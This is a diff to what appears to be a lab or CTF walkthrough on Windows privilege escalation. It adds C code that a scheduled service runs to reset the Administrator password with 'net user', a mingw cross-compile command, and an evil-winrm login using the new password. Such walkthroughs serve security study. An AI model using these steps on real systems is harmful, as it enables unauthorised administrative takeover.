@@ -238,8 +238,29 @@ int main ()
 }
 ```
 ![alt text](image-6.png)
+## (ALTERNATE) Create a Binary to change the Administrator password (Instead of new user)
+```bash
+#On Kali - Call it adduser.c
 
-## cross-compile the code
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user administrator admin@123");
+  
+  return 0;
+}
+
+# Compile it
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+# NOTE: Wait 2-3 minutes for the scheduled service to execute the binary automatically
+# What to do next? Log in as Administrator with the new password:
+evil-winrm -i <TARGET IP> -u administrator -p 'admin@123'
+```
+## cross-compile the code (No need if you can log in already)
 
 ```bash
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
